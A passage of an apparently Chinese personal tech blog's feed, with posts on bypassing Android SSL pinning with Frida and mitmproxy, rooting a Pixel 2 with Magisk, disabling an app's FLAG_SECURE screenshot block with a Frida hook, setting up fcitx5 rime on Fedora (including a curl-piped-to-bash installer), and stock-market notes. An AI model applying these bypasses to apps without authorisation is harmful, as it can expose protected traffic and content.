class="string">&quot;[Ljavax.net.ssl.KeyManager;&quot;</span>, <span class="string">&quot;[Ljavax.net.ssl.TrustManager;&quot;</span>, <span class="string">&quot;java.security.SecureRandom&quot;</span>).call(<span class="built_in">this</span>, a, tmf.getTrustManagers(), c);</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="string">&quot;[+] SSLContext initialized with our custom TrustManager!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;,<span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>执行下面命令，绕过 SSL pinning</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">frida -U --codeshare pcipolloni/universal-android-ssl-pinning-bypass-with-frida -F</span><br><span class="line"></span><br><span class="line">     ____</span><br><span class="line">    / _  |   Frida 14.2.18 - A world-class dynamic instrumentation toolkit</span><br><span class="line">   | (_| |</span><br><span class="line">    &gt; _  |   Commands:</span><br><span class="line">   /_/ |_|       help      -&gt; Displays the help system</span><br><span class="line">   . . . .       object?   -&gt; Display information about &#x27;object&#x27;</span><br><span class="line">   . . . .       exit/quit -&gt; Exit</span><br><span class="line">   . . . .</span><br><span class="line">   . . . .   More info at https://frida.re/docs/home/</span><br><span class="line"></span><br><span class="line">[.] Cert Pinning Bypass/Re-Pinning</span><br><span class="line">[+] Loading our CA...</span><br><span class="line">[o] Our CA Info: O=mitmproxy, CN=mitmproxy</span><br><span class="line">[+] Creating a KeyStore for our CA...</span><br><span class="line">[+] Creating a TrustManager that trusts the CA in our KeyStore...</span><br><span class="line">[+] Our TrustManager is ready...</span><br><span class="line">[+] Hijacking SSLContext methods now...</span><br><span class="line">[-] Waiting for the app to invoke SSLContext.init()...</span><br><span class="line">[Pixel 2::智能生活]-&gt; exit</span><br></pre></td></tr></table></figure><p>其中 <code>-F</code> 参数 attach to frontmost application 不用指定 pid 或者包名，非常方便。</p><h3 id="使用-mitmweb-查看报文"><a href="#使用-mitmweb-查看报文" class="headerlink" title="使用 mitmweb 查看报文"></a>使用 mitmweb 查看报文</h3><p>执行 <code>mitmweb -p 8080</code> 后可以用浏览器访问 <a href="http://127.0.0.1:8081/">http://127.0.0.1:8081/</a> 查看报文，如果需要共享报文数据可以使用<br>mitmweb 界面提供的 save 功能，会保存成一个 flow 文件，后面使用 mitmweb 界面提供的 open 打开报文文件即可展示报文详细信息。</p><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p><a href="https://shunix.com/ssl-pinning/">https://shunix.com/ssl-pinning/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;SSL-pinning&quot;&gt;&lt;a href=&quot;#SSL-pinning&quot; class=&quot;headerlink&quot; title=&quot;SSL pinning&quot;&gt;&lt;/a&gt;SSL pinning&lt;/h3&gt;&lt;p&gt;SSL Pinning是一种防止中间人攻击的技术，主要机制是在客户端</summary>
      
    
    
    
    
    <category term="Android" scheme="http://usmacd.com/tags/Android/"/>
    
    <category term="Security" scheme="http://usmacd.com/tags/Security/"/>
    
  </entry>
  
  <entry>
    <title>关于A股变盘的假期效应思考</title>
    <link href="http://usmacd.com/2021/08/23/a_change/"/>
    <id>http://usmacd.com/2021/08/23/a_change/</id>
    <published>2021-08-23T03:47:40.473Z</published>
    <updated>2021-08-23T03:47:40.473Z</updated>
    
    <content type="html"><![CDATA[<p>沉浮 A股多年，发现一个比较重要的规律，A 股变盘的时间节点大多发生在重大节假日期间，分别举例如下：</p><ul><li>「1」重大节日 （包括阳历和农历： 劳动节，国庆节，中秋节，端午节，过年 等）</li><li>「2」周一/周五</li><li>「3」月初/月末</li></ul><p>有人总结出 A 股变盘时间节点和农历的 24 节气相关，每个节气的时间间隔大致在 15 到 16 天左右，这条规律<br>其实和上面的 「1」 说法是一致的。</p><p>思考其背后的原因，平时交易日都是连续的中间无间断，大家的交易思路和看法也比较容易连续一致。<br>每逢重大节日，或者月初月末，往往都是放假休息的时间，外加期间各种信息的输入量比平时大很多，这样容易有思维波动。重大节日后，主力一带节奏，容易对大家的思维进行强化，分歧转一致后，就真的变盘了。</p><p>A股还有个月初，月末效应，月初赚钱，月末亏钱，比较奇怪，可能和基金经理的月初建仓和月末考核相关，这条规律几乎是对称的，如果月末没有大跌，月初基本就没有大赚效应。</p><p>后面发现居然有一个股票技术分析流派叫季节派。（季节理论 Season Theory）</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;沉浮 A股多年，发现一个比较重要的规律，A 股变盘的时间节点大多发生在重大节假日期间，分别举例如下：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;「1」重大节日 （包括阳历和农历： 劳动节，国庆节，中秋节，端午节，过年 等）&lt;/li&gt;
&lt;li&gt;「2」周一/周五&lt;/li&gt;
&lt;li&gt;「3」月初/</summary>
      
    
    
    
    
    <category term="investment" scheme="http://usmacd.com/tags/investment/"/>
    
  </entry>
  
  <entry>
    <title>afl-fuzz 框架</title>
    <link href="http://usmacd.com/2021/08/17/afl/"/>
    <id>http://usmacd.com/2021/08/17/afl/</id>
    <published>2021-08-17T07:24:09.415Z</published>
    <updated>2021-08-17T07:24:09.415Z</updated>
    
    <content type="html"><![CDATA[<p>afl-fuzz 的整体架构，新手理解起来还是比较费劲，网络上发现一张图觉得不错，放上来大家看看，感谢原作者。</p><p><img src="https://raw.githubusercontent.com/henices/pictures/master/afl-fuzz.png" alt="afl-fuzz"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;afl-fuzz 的整体架构，新手理解起来还是比较费劲，网络上发现一张图觉得不错，放上来大家看看，感谢原作者。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/henices/pictures/master/afl-fu</summary>
      
    
    
    
    
    <category term="Security" scheme="http://usmacd.com/tags/Security/"/>
    
  </entry>
  
  <entry>
    <title>root Pixel2 Android 11 的方法</title>
    <link href="http://usmacd.com/2021/07/26/root_android11_pixel2/"/>
    <id>http://usmacd.com/2021/07/26/root_android11_pixel2/</id>
    <published>2021-07-26T06:25:53.315Z</published>
    <updated>2021-07-26T06:25:53.315Z</updated>
    
    <content type="html"><![CDATA[<p>要正常使用 frida 首先需要把手机给 root 了， 在最近测试的情况发现 Android 10 和 Android 11 系统工作比较正常， Android 6<br>和其他系统似乎差一些？</p><p>要刷机首先需要下载 <code>adb</code> 等工具，这些工具由 Android 的 SDK platform tools 提供，下载地址为：<a href="https://developer.android.com/studio/releases/platform-tools">https://developer.android.com/studio/releases/platform-tools</a><br>选择相应的操作系统版本下载即可， Google 提供了 Windows、Linux、Mac 等系统的支持。</p><p>基础镜像可以选择的 Google 的官方镜像 Factory Image，如果能自己编译 Android 系统则更好，在调试的时候可以看到系统库的符号。</p><p>我的 Android 手机为 Pixel 2 在 <a href="https://developers.google.com/android/images#walleye">https://developers.google.com/android/images#walleye</a> 上可以查找相应的镜像， 下个最新的 <a href="https://dl.google.com/dl/android/aosp/walleye-rp1a.201005.004.a1-factory-0c23f6cf.zip">https://dl.google.com/dl/android/aosp/walleye-rp1a.201005.004.a1-factory-0c23f6cf.zip</a></p><p>要想刷镜像前提条件是先要解锁 bootloader， Pixel2 新手机解锁的命令和以前有变化，可以参考 <a href="https://source.android.com/devices/bootloader/locking_unlocking">https://source.android.com/devices/bootloader/locking_unlocking</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">adb reboot bootloader</span><br><span class="line">fastboot flashing unlock_critical</span><br></pre></td></tr></table></figure><p>下载解压后，里面有个 flash-all 的脚本，将手机重启到 fastboot 模式后可以直接运行， <code>adb reboot bootloader</code>， 重启到 fastboot 模式后，执行 flash-all 脚本，刷机系统镜像就完成了。</p><p>以前 root  Android 用的都是 SuperSU 和 TWRP， 这次使用了一个不同的方法 <a href="https://github.com/topjohnwu/Magisk">Magisk</a> ， 安装的方法参见：<br><a href="https://topjohnwu.github.io/Magisk/install.html">https://topjohnwu.github.io/Magisk/install.html</a></p><p>有两种模式， patch boot 或者 patch recovery， 安装 Magisk app 后如果界面显示  <code>Ramdisk：Yes</code>，则需要 patch boot。<br>Magisk app 的下载地址 <a href="https://github.com/topjohnwu/Magisk/releases/download/v23.0/Magisk-v23.0.apk">https://github.com/topjohnwu/Magisk/releases/download/v23.0/Magisk-v23.0.apk</a></p><p>安装 Magisk app 后， 选择需要 patch 的镜像文件，选择后会自动生成新的修改过后的镜像文件。<br>获得修改后的镜像文件后，需要将修改后的镜像文件重新刷一次</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fastboot flash boot /path/to/magisk_patched.img <span class="comment">#or fastboot flash recovery /path/to/magisk_patched.img</span></span><br></pre></td></tr></table></figure><p>刷完新的修改后的镜像，重启系统，Root 就完成了。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;要正常使用 frida 首先需要把手机给 root 了， 在最近测试的情况发现 Android 10 和 Android 11 系统工作比较正常， Android 6&lt;br&gt;和其他系统似乎差一些？&lt;/p&gt;
&lt;p&gt;要刷机首先需要下载 &lt;code&gt;adb&lt;/code&gt; 等工具，</summary>
      
    
    
    
    
    <category term="Android" scheme="http://usmacd.com/tags/Android/"/>
    
  </entry>
  
  <entry>
    <title>fedora 上安装 fcitx5 rime</title>
    <link href="http://usmacd.com/2021/07/26/fcitx5-rime/"/>
    <id>http://usmacd.com/2021/07/26/fcitx5-rime/</id>
    <published>2021-07-26T02:11:58.423Z</published>
    <updated>2021-07-26T02:11:58.423Z</updated>
    
    <content type="html"><![CDATA[<p>现在 fcitx 已经升级到了 fcitx5, 本来用着 fcitx4 挺好，也没有想着升级，在折腾 fcitx.vim 的时候发现 fcitx 居然升级了，<br>使得我的 vim 插件无法正常工作了，一顿折腾，本来以为很简单没想到进了个大坑 。<br>主要是不愿意放弃我的一万多行的 rime 用户词库，多年的积累了，不过 Linux 用户不就是老折腾吗， 唉。</p><p>fcitx5-rime 的默认的配置目录已经变为 <code>~/.local/share/fcitx5/rime</code>， fcitx4 默认的配置目录是 <code>~/.config/fcitx/rime</code></p><h2 id="安装-fcitx5-和-fcitx5-rime"><a href="#安装-fcitx5-和-fcitx5-rime" class="headerlink" title="安装 fcitx5 和 fcitx5 rime"></a>安装 fcitx5 和 fcitx5 rime</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo dnf install -y fcitx5 fcitx5-autostart fcitx5-chinese-addons fcitx5-configtool fcitx5-gtk fcitx5-qt</span><br><span class="line">sudo dnf install -y fcitx5-rime</span><br></pre></td></tr></table></figure><p>Fedora dnf 已经默认有 fcitx5-rime 的安装包了，不用自己重新编译了，非常不错。 <code>fcitx5-chinese-addons </code><br>为 fcitx5 自己默认带的中文输入法，这些和 rime 没有什么关系，网络上有人说， fcitx 的中文输入较以前有较大改进。<br><code>fcitx5-autostart</code> 用于自启动。后面发现系统自带的启动环境变量好像设置的有问题，不安装其实也没有什么问题，<br>自己手动执行 <code>fcitx5 -d</code> 即可。</p><h2 id="设置正确的环境变量"><a href="#设置正确的环境变量" class="headerlink" title="设置正确的环境变量"></a>设置正确的环境变量</h2><p>修改  <code>~/.xprofile</code>， <code>~/.zshrc</code> ， <code>/etc/profile</code> 等文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">export GTK_IM_MODULE=fcitx5</span><br><span class="line">export QT_IM_MODULE=fcitx5</span><br><span class="line">export XMODIFIERS=&quot;@im=fcitx5&quot;</span><br></pre></td></tr></table></figure><h2 id="编译-fcitx5-qt5"><a href="#编译-fcitx5-qt5" class="headerlink" title="编译 fcitx5-qt5"></a>编译 fcitx5-qt5</h2><p>为了使我们自己编译的 vnote 可以正常使用 fcitx5， 需要编译 fcitx5-qt</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> git@github.com:fcitx/fcitx5-qt.git</span><br><span class="line"></span><br><span class="line">cat &lt;&lt; <span class="string">EOF &gt; build_linux.sh</span></span><br><span class="line"><span class="string">QTDIR=&quot;/home/henices/Qt5.12.9/5.12.9/gcc_64/&quot;</span></span><br><span class="line"><span class="string">PATH=&quot;$QTDIR/bin:$PATH&quot;</span></span><br><span class="line"><span class="string">LDFLAGS=-L$QTDIR/lib</span></span><br><span class="line"><span class="string">CPPFLAGS=-I$QTDIR/include</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">rm -rf build</span></span><br><span class="line"><span class="string">mkdir -p build</span></span><br><span class="line"><span class="string">cd build</span></span><br><span class="line"><span class="string">cmake ..</span></span><br><span class="line"><span class="string">make -j8</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"></span><br><span class="line">bash build_linux.sh</span><br></pre></td></tr></table></figure><p>编译完成后将生成的 so 文件 copy 到 qt 的插件目录： </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> build</span><br><span class="line">cp ./qt5/platforminputcontext/libfcitx5platforminputcontextplugin.so /home/henices/Qt5.12.9/5.12.9/gcc_64/plugins/platforminputcontexts/</span><br></pre></td></tr></table></figure><h2 id="配置中文环境"><a href="#配置中文环境" class="headerlink" title="配置中文环境"></a>配置中文环境</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/locale.conf</span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> LANG=<span class="string">&quot;zh_CN.UTF-8&quot;</span></span><br><span class="line"><span class="built_in">export</span> LC_CTYPE=<span class="string">&quot;zh_CN.UTF-8&quot;</span></span><br></pre></td></tr></table></figure><h2 id="安装-rime-词库"><a href="#安装-rime-词库" class="headerlink" title="安装 rime 词库"></a>安装 rime 词库</h2><p>rime 现在已经使用 plum 管理词库，如果需要安装双拼输入法的，可以执行下面的命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -fsSL https://git.io/rime-install | bash</span><br><span class="line">rime_frontend=fcitx5-rime bash rime-install double_pinyin</span><br></pre></td></tr></table></figure><p>rime 为了保证输入速度，词库很小，为了能够自动显示更多的词组，就需要使用拓展词库。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/rime-aca/dictionaries.git</span><br><span class="line">cp dictionaries/luna_pinyin.dict/* ~/.<span class="built_in">local</span>/share/fcitx5/rime/</span><br></pre></td></tr></table></figure><p>安装了上面的拓展词库后，输入特殊符号的能力还是比较弱，需要把 symbols.yaml 也给加进来。</p><p><a href="https://github.com/rime/rime-prelude">https://github.com/rime/rime-prelude</a> 提供了我们所需要的 symbols.yaml 和 default.yaml,<br>可以使用 <a href="https://github.com/rime/plum">東風破</a> 安裝： <code>rime_frontend=fcitx5-rime bash rime-install prelude</code></p><p>由于我们使用的是自然码双拼，需要修改的文件为 <code>double_pinyin.custom.yaml</code></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">patch:</span></span><br><span class="line">  <span class="comment"># 載入朙月拼音擴充詞庫</span></span><br><span class="line">  <span class="attr">&quot;translator/dictionary&quot;:</span> <span class="string">luna_pinyin.extended</span></span><br><span class="line">  <span class="attr">&quot;punctuator/import_preset&quot;:</span> <span class="string">symbols</span></span><br><span class="line">  <span class="attr">&quot;recognizer/patterns/punct&quot;:</span> <span class="string">&quot;^/([A-Z|a-z]*|[0-9]|10)$&quot;</span></span><br></pre></td></tr></table></figure><p>设置完成后，要重新启动输入法，比如要输入 ☆ ，输入  <code>/xh</code> 即可</p><h2 id="将用户词库导入-rime"><a href="#将用户词库导入-rime" class="headerlink" title="将用户词库导入 rime"></a>将用户词库导入 rime</h2><p><code>rime_dict_manager -i luna_pinyin luna_pinyin.userdb.txt</code></p><p>这一步很关键啊，多年的积累不能浪费了。</p><h2 id="配置-fcitx5-皮肤"><a href="#配置-fcitx5-皮肤" class="headerlink" title="配置 fcitx5 皮肤"></a>配置 fcitx5 皮肤</h2><p>fcitx5 默认的皮肤不太好看，所以下载更新了皮肤，这款简约风格的皮肤非常符合老夫的胃口。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/thep0y/fcitx5-themes.git</span><br><span class="line">cp spring ~/.<span class="built_in">local</span>/share/fcitx5/themes -r</span><br></pre></td></tr></table></figure><p>修改配置文件 <code>~/.config/fcitx5/conf/classicui.conf</code></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 垂直候选列表</span></span><br><span class="line"><span class="string">Vertical</span> <span class="string">Candidate</span> <span class="string">List=False</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 按屏幕 DPI 使用</span></span><br><span class="line"><span class="string">PerScreenDPI=True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Font (设置成你喜欢的字体)</span></span><br><span class="line"><span class="string">Font=&quot;Smartisan</span> <span class="string">Compact</span> <span class="string">CNS</span> <span class="number">13</span><span class="string">&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 主题(这里要改成你想要使用的主题名，主题名就在下面)</span></span><br><span class="line"><span class="string">Theme=spring</span></span><br></pre></td></tr></table></figure><p>另外还有一款 fcitx5 皮肤相对流行：<a href="https://github.com/hosxy/Fcitx5-Material-Color">https://github.com/hosxy/Fcitx5-Material-Color</a></p><p>切换皮肤的方法是，点击鼠标右键点击 配置 -&gt; 附加组件 -&gt; 经典用户界面 -&gt; 点击右边图标 -&gt; 选择皮肤</p><h2 id="设置-fcitx-rime-单行模式"><a href="#设置-fcitx-rime-单行模式" class="headerlink" title="设置 fcitx rime 单行模式"></a>设置 fcitx rime 单行模式</h2><p>如果要将输入法设置为单行模式，需要修改配置文件 <code>~/.config/fcitx5/conf/rime.conf</code></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">PreeditInApplication=True</span></span><br></pre></td></tr></table></figure><p>或者按快捷键 <code>ctrl + alt + p</code>, 这个快捷键可以来回切换很方便，单行还是双行就因人而异了，我个人觉得单行好点。</p><h2 id="让-fcitx5-正确显示菜单"><a href="#让-fcitx5-正确显示菜单" class="headerlink" title="让 fcitx5 正确显示菜单"></a>让 fcitx5 正确显示菜单</h2><p>要做这个步骤是因为 rime 有 「部署」、「同步」这几个操作按钮，如果不正确配置的话在 fcitx5 上没法正常显示。<br>fcitx5 在任务上有个托盘图标，点击右键就可以看到这些菜单。</p><p>要让 fcitx 正确显示菜单，关键在于让 rime 输入法默认处于激活状态，根据 fcitx5 配置的提示第一个输入法为非激活状态。</p><ul><li>（1） 将第一个输入法设置为  键盘-英语 （美国），第二个输入法设置为 中州韵</li><li>（2） 在全局设置中，勾上默认状态为激活，共享输入状态设置为 <code>程序</code></li></ul><h2 id="fcitx-vim"><a href="#fcitx-vim" class="headerlink" title="fcitx.vim"></a>fcitx.vim</h2><p>这个章节是写给 linux vim 用户看的，没有此需求的可以直接跳过这段。</p><p>vim 确实是程序编辑的利器，但是在用vim 写中文文档的时候，有一个痛点，你在用 fcitx 写中文的时候想保存文档，<br>vim 必须切换到 normal 模式才能输入保存的命令 <code>:w</code>，进入normal 模式的方法是连续按两下 ESC，好了现在你应该<br>输入命令了，但是你没法输入你现在还在打中文呢，没有办法你必须先切换到英文输入法，然后才能正确地输入 <code>:w</code> 痛苦啊。</p><p>fcitx.vim 就是为解决这个痛点而生的插件，个人觉得这是vim 必装的几个插件之一。fcitx.vim 的github 仓库<br>地址为：<a href="https://github.com/lilydjwg/fcitx.vim">https://github.com/lilydjwg/fcitx.vim</a></p><p>值得一提的是这个仓库有两个分支，fcitx4 分支 和 fcitx5 分支，使用的时候一定要分清楚，这两个分支如果<br>使用错了，就没法正常使用 fcitx.vim 插件了。fcitx4 和 fcitx5 dbus 对象名字有变化，导致代码通用性不好。<br>现在默认分支为 fcitx5，如果你使用 fcitx4 可能直接 git clone 下来就会发现插件用不了，我也是因为这个<br>原因才发现 fcitx 居然更新了。</p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>可能有些人不知道为什么要折腾 rime，rime 的用户词库文件是个宝贝，这个词库是都是你真实的在日常使用中用到的词库，小巧又实用还能到处同步，上传到云后永不丢失，符合自己的数据自己掌握的硬道理。至于国内的那些输入法，我就不加以评价了，在这商业的社会要保持基本的做人底线不易。</p><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ul><li><a href="https://xuthus.cc/misc/fedora-install-fcitx5.html">https://xuthus.cc/misc/fedora-install-fcitx5.html</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;现在 fcitx 已经升级到了 fcitx5, 本来用着 fcitx4 挺好，也没有想着升级，在折腾 fcitx.vim 的时候发现 fcitx 居然升级了，&lt;br&gt;使得我的 vim 插件无法正常工作了，一顿折腾，本来以为很简单没想到进了个大坑 。&lt;br&gt;主要是不愿意放弃我</summary>
      
    
    
    
    
    <category term="linux" scheme="http://usmacd.com/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>恢复 Android App 的截屏功能</title>
    <link href="http://usmacd.com/2021/07/20/disable_security_flags/"/>
    <id>http://usmacd.com/2021/07/20/disable_security_flags/</id>
    <published>2021-07-20T08:34:48.860Z</published>
    <updated>2021-07-20T08:34:48.860Z</updated>
    
    <content type="html"><![CDATA[<p>今天遇上某 App 禁止截屏，其实就是使用了下面这段代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getWindow().setFlags(LayoutParams.FLAG_SECURE, LayoutParams.FLAG_SECURE);</span><br></pre></td></tr></table></figure><p>使用 frida 脚本可以绕过绕过这个限制 （使用 frida 需要将手机 root）。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Java.perform(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">   <span class="comment">// https://developer.android.com/reference/android/view/WindowManager.LayoutParams.html#FLAG_SECURE</span></span><br><span class="line">   <span class="keyword">var</span> FLAG_SECURE = <span class="number">0x2000</span>;</span><br><span class="line">   <span class="keyword">var</span> Window = Java.use(<span class="string">&quot;android.view.Window&quot;</span>);</span><br><span class="line">   <span class="keyword">var</span> setFlags = Window.setFlags;  <span class="comment">//.overload(&quot;int&quot;, &quot;int&quot;)</span></span><br><span class="line"></span><br><span class="line">   setFlags.implementation = <span class="function"><span class="keyword">function</span> (<span class="params">flags, mask</span>) </span>&#123;</span><br><span class="line">       <span class="built_in">console</span>.log(<span class="string">&quot;Disabling FLAG_SECURE...&quot;</span>);</span><br><span class="line">       flags &amp;= ~FLAG_SECURE;</span><br><span class="line">       setFlags.call(<span class="built_in">this</span>, flags, mask);</span><br><span class="line">       <span class="comment">// Since setFlags returns void, we don&#x27;t need to return anything</span></span><br><span class="line">   &#125;;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>执行 frida 命令 <code>frida -U -l disable.js -n com.apps.android --no-pause</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$ frida -U -l disable.js -n com.apps.android --no-pause</span><br><span class="line"></span><br><span class="line">[Pixel 2::com.apps.android]-&gt;</span><br><span class="line">[Pixel 2::com.apps.android]-&gt;</span><br><span class="line">[Pixel 2::com.apps.android]-&gt; Disabling FLAG_SECURE...</span><br><span class="line">Disabling FLAG_SECURE...</span><br><span class="line">Disabling FLAG_SECURE...</span><br><span class="line">Disabling FLAG_SECURE...</span><br><span class="line">Disabling FLAG_SECURE...</span><br><span class="line">Disabling FLAG_SECURE...</span><br><span class="line">Disabling FLAG_SECURE...</span><br><span class="line">Disabling FLAG_SECURE...</span><br><span class="line">Disabling FLAG_SECURE...</span><br><span class="line">Disabling FLAG_SECURE...</span><br></pre></td></tr></table></figure><p>值得注意的是，这里使用了 <code>-n</code> 参数， attach 到目标进程，要不 App 会自动重启。看到输出调试信息后，<br>就可以正常截屏了。</p><h3 id="使用-objection"><a href="#使用-objection" class="headerlink" title="使用 objection"></a>使用 objection</h3><p>objection「2」有此功能，执行下面命令即可： <code>android ui FLAG_SECURE false</code>  但是我测试失败了。</p><h3 id="截屏小技巧-（lzx）"><a href="#截屏小技巧-（lzx）" class="headerlink" title="截屏小技巧 （lzx）"></a>截屏小技巧 （lzx）</h3><p>Android 截屏，可以使用一个快速的技巧  <code>adb exec-out screencap -p &gt; test.png</code></p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li>[1] <a href="https://bhamza.me/2019/11/03/Android-Frida-hooking-disabling-FLAG-SECURE.html">https://bhamza.me/2019/11/03/Android-Frida-hooking-disabling-FLAG-SECURE.html</a></li><li>[2] <a href="https://github.com/sensepost/objection">https://github.com/sensepost/objection</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;今天遇上某 App 禁止截屏，其实就是使用了下面这段代码&lt;/p&gt;
&lt;figure class=&quot;highlight java&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;</summary>
      
    
    
    
    
    <category term="Android" scheme="http://usmacd.com/tags/Android/"/>
    
    <category term="Security" scheme="http://usmacd.com/tags/Security/"/>
    
  </entry>
  
  <entry>
    <title>高效复盘技巧</title>
    <link href="http://usmacd.com/2021/06/28/fupangjiqiao/"/>
    <id>http://usmacd.com/2021/06/28/fupangjiqiao/</id>
    <published>2021-06-28T05:37:10.630Z</published>
    <updated>2021-06-28T05:37:10.630Z</updated>
    
    <content type="html"><![CDATA[<p>前些年总结的，现在看起来，过于复杂了，可能做短线的会有需求。</p><p><img src="https://github.com/henices/pictures/raw/master/webwxgetmsgimg.jpeg" alt="image"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;前些年总结的，现在看起来，过于复杂了，可能做短线的会有需求。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://github.com/henices/pictures/raw/master/webwxgetmsgimg.jpeg&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
</summary>
      
    
    
    
    
    <category term="investment" scheme="http://usmacd.com/tags/investment/"/>
    
  </entry>
  
  <entry>
    <title>紫竹桥附近看病情况</title>
    <link href="http://usmacd.com/2021/06/28/304/"/>
    <id>http://usmacd.com/2021/06/28/304/</id>
    <published>2021-06-28T05:26:53.143Z</published>
    <updated>2021-06-28T05:26:53.143Z</updated>
    
